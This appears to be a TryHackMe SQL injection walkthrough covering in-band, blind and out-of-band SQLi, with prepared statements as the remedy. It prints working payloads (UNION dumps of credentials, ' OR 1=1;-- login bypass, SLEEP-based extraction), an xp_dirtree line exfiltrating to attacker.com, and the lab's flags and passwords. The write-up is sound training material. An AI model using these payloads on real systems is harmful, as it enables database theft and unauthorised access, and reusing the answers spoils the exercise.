# 🕵️ SQL Injection — Walkthrough

> **Author:** [Huzaifa Mohammed](https://www.google.com/search?q=https://github.com/HuzaifaMohammed00)  
> **Platform:** [TryHackMe — SQL Injection Introduction](https://tryhackme.com/room/sqlinjectionintroduction) / [SQL Injection](https://tryhackme.com/room/sqlinjectionlm)  
> **Category:** Web Application Security (`OWASP Top 10`)

## 📌 Scenario

This room covers how **SQL Injection (`SQLi`)** vulnerabilities occur when user input is inserted directly into backend database queries without parameterization. Across the theory tasks and four hands-on lab levels, we exploit `In-Band (Error-Based & Union-Based)`, `Blind (Authentication Bypass, Boolean-Based, & Time-Based)`, and `Out-of-Band` SQL Injection, and learn how to fix them with `Prepared Statements`.

## 🔍 Step-by-Step Walkthrough

### Part 1: Core SQL & Injection Concepts (Updated Room Questions)

#### 1. What SQL statement combines results from two SELECT queries into one result set? (Task 2)

The `UNION` operator appends the results of a second `SELECT` query onto the original query output, provided both queries have the same column count.

```sql
SELECT id, title, content FROM articles UNION SELECT 1, username, password FROM staff_users;
```

**Answer:** `UNION`

#### 2. What built-in database contains metadata about all other databases, tables, and columns in MySQL? (Task 2)

Every `MySQL` database includes the `information_schema` catalog, which stores the names of all schemas, tables (`information_schema.tables`), and columns (`information_schema.columns`).

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = database();
```

**Answer:** `information_schema`

#### 3. What character is commonly used as a first test when probing for SQL injection? (Task 3)

Injecting a single quote (`'`) breaks out of an unparameterized SQL string literal and triggers a syntax error if the input is vulnerable.

```sql
'
```

**Answer:** `'`

#### 4. What type of SQL Injection returns results directly in the web page? (Task 3)

`In-Band` SQL Injection uses the same communication channel (the HTTP response page) to both send the payload and view the extracted database data.

```text
Same channel for injection & output -> In-Band
```

**Answer:** `In-Band`

#### 5. What subtype of In-Band SQLi relies on database error messages to extract information? (Task 4)

`Error-Based` SQL Injection forces the database to generate verbose error messages that leak table names, column types, or query structure.

```text
In-Band SQLi via database errors -> Error-Based
```

**Answer:** `Error-Based`

#### 6. What SQL function returns the name of the current database in MySQL? (Task 4)

Calling `database()` inside a `SELECT` or `UNION SELECT` query outputs the active database schema name.

```sql
0 UNION SELECT 1,2,database()
```

**Answer:** `database()`

#### 7. What boolean condition is commonly injected to make a WHERE clause always evaluate to true? (Task 5)

Injecting `1=1` after `OR` forces the `WHERE` condition to evaluate to `TRUE` for every row in the table, bypassing login checks.

```sql
' OR 1=1;--
```

**Answer:** `1=1`

#### 8. What MySQL function causes a deliberate time delay in a query's response? (Task 6)

In `Time-Based Blind SQLi`, `SLEEP()` pauses database execution for a specified number of seconds when a tested condition is true.

```sql
admin123' UNION SELECT SLEEP(5),2;--
```

**Answer:** `SLEEP()` (or `SLEEP`)

#### 9. What protocol beginning with D is commonly used to exfiltrate data in Out-of-Band SQLi? (Task 7)

When no direct output or timing signal is available, attackers force the database server to send stolen data as subdomains inside outbound `DNS` lookup requests.

```text
Out-of-Band (OOB) Exfiltration -> DNS
```

**Answer:** `DNS`

#### 10. What MSSQL stored procedure can be used to trigger DNS lookups for data exfiltration? (Task 7)

In `Microsoft SQL Server (MSSQL)`, the extended stored procedure `xp_dirtree` resolves a `UNC` path over `DNS`/`SMB`, allowing attackers to exfiltrate query output to an external listener.

```sql
EXEC master..xp_dirtree '\\attacker.com\share';
```

**Answer:** `xp_dirtree`

#### 11. Name a method of protecting yourself from an SQL Injection exploit (Task 8)

**Prepared Statements** (Parameterized Queries) separate the SQL query structure from user input using placeholders (`?`), ensuring user input is never executed as SQL commands.

```python
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

**Answer:** `Prepared Statements`

*(Note for Classic Room SQL Basics Questions: SQL stands for `Structured Query Language`, controlled by a `DBMS`, stored in a `table`, retrieved with `SELECT`, added with `INSERT`, and terminated by `;`.)*

### Part 2: Hands-On Practical Lab Levels (Levels 1 – 4)

#### 12. Level 1 Flag — Union-Based SQLi (In-Band)

Determine that the query uses 3 columns (`1 UNION SELECT 1,2,3`), set `id=0` so only our `UNION` row displays, enumerate `sqli_one` tables via `information_schema.tables`, and dump `staff_users` to get `martin`'s password (`p4ssword`) for Level 2:

```sql
0 UNION SELECT 1,2,database()
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

#### 13. Level 2 Flag — Blind SQLi: Authentication Bypass

Bypass the login form by injecting `' OR 1=1;--` into the username field so the query `SELECT * FROM users WHERE username='' OR 1=1;--` logs in directly and reveals the flag.

```sql
' OR 1=1;--
```

**Answer:** `THM{SQL_INJECTION_3840}`

#### 14. Level 3 Flag — Boolean-Based Blind SQLi

The registration check endpoint only returns `{"taken":true}` or `{"taken":false}`. Use `UNION SELECT` with `LIKE` to brute-force the database name (`sqli_three`), table name (`users`), and `admin` password (`3845`) character by character, then log in as `admin`:

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sqli_three%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' AND table_name = 'users';--
admin123' UNION SELECT 1,2,3 FROM users WHERE username = 'admin' AND password LIKE '3845%';--
```

**Answer:** `THM{SQL_INJECTION_1093}`

#### 15. Level 4 Flag — Time-Based Blind SQLi

With no visual feedback on the page, inject `SLEEP(5)` into the `referrer` header and watch for a 5-second response delay to enumerate the `sqli_four` database and extract the `admin` password (`4961`):

```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'sqli_four%';--
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '4961%';--
```

**Answer:** `THM{SQL_INJECTION_MASTER}`

## 💡 Key Takeaways

* **Three Main `SQLi` Channels**: `In-Band` (`Error-Based` & `Union-Based`) displays results directly; `Blind` (`1=1` Auth Bypass, `Boolean-Based`, & `SLEEP()` `Time-Based`) infers answers from behavior or timing; `Out-of-Band` exfiltrates data via `DNS` (`xp_dirtree`).
* **Database Enumeration Workflow**: Find column count -> find visible column -> call `database()` -> query `information_schema.tables` -> query `information_schema.columns` -> dump target columns.
* **Permanent Remediation**: Always use **Prepared Statements** with parameterized placeholders (`?`) so user input cannot alter SQL query logic ([TryHackMe SQL Injection Introduction](https://tryhackme.com/room/sqlinjectionintroduction)).
